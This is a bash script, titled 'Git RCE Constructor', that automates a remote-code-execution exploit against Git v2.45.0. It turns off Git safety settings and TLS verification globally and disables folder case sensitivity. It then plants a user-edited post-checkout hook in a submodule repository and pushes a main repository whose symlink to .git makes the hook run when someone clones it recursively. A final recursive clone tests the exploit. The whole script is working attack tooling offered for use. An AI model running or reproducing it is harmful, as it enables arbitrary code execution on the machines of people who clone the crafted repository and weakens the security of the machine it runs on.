#!/bin/bash
set +x
echo Git RCE Constructor v1.6 \(Update Mode\)
echo -e "\033]0;Git RCE Constructor v1.6 (Update Mode)\007"
echo Notice: You must use Git v2.45.0 for this exploit to work!
read -r -p "Main repository URL: " main_repo_path
read -r -p "Hook repository URL: " hook_repo_path
set -x
git config --global protocol.file.allow always
git config --global core.protectNTFS false
git config --global http.sslVerify false
git config --global core.symlinks true
if [ -z "$(git config --global user.name)" ]; then
git config --global user.name "$USERNAME"
fi
if [ -z "$(git config --global user.email)" ]; then
git config --global user.email "$USERNAME"
fi
echo Updating hook repo...
mkdir -p git_rce_hook
if fsutil file 2>&1 | grep -qi "setCaseSensitiveInfo"; then
fsutil file setcasesensitiveinfo git_rce_hook disable
fi
git clone --recursive "$hook_repo_path" git_rce_hook
cd git_rce_hook
git_editor=$(git config --get core.editor)
if [ -z "$git_editor" ]; then
git_editor="vim"
fi
"$git_editor" "$PWD/scripts/hooks/post-checkout"
git add scripts/hooks/post-checkout
git commit -m "update-post-checkout"
git push origin $(git rev-parse --abbrev-ref HEAD)
cd ..
echo Updating main repo...
mkdir -p git_rce_main
if fsutil file 2>&1 | grep -qi "setCaseSensitiveInfo"; then
fsutil file setcasesensitiveinfo git_rce_main disable
fi
git clone --no-recursive "$main_repo_path" git_rce_main
cd git_rce_main
git rm gitlnk
git commit -m "remove-symlink"
git submodule update --init --recursive
git submodule update --remote GITLNK/modules/RCE
git add GITLNK/modules/RCE
git commit -m "update-submodule"
git update-index --add --cacheinfo 120000 $(echo -n ".git" | git hash-object -w --stdin) gitlnk
git commit -m "add-symlink"
git push origin $(git rev-parse --abbrev-ref HEAD)
cd ..
echo Testing the exploit...
mkdir -p git_rce_test
if fsutil file 2>&1 | grep -qi "setCaseSensitiveInfo"; then
fsutil file setcasesensitiveinfo git_rce_test disable
fi
git clone --recursive "$main_repo_path" git_rce_test
set +x
echo All done!
echo -n "Press any key to continue . . ."
read -N 1
exit 0
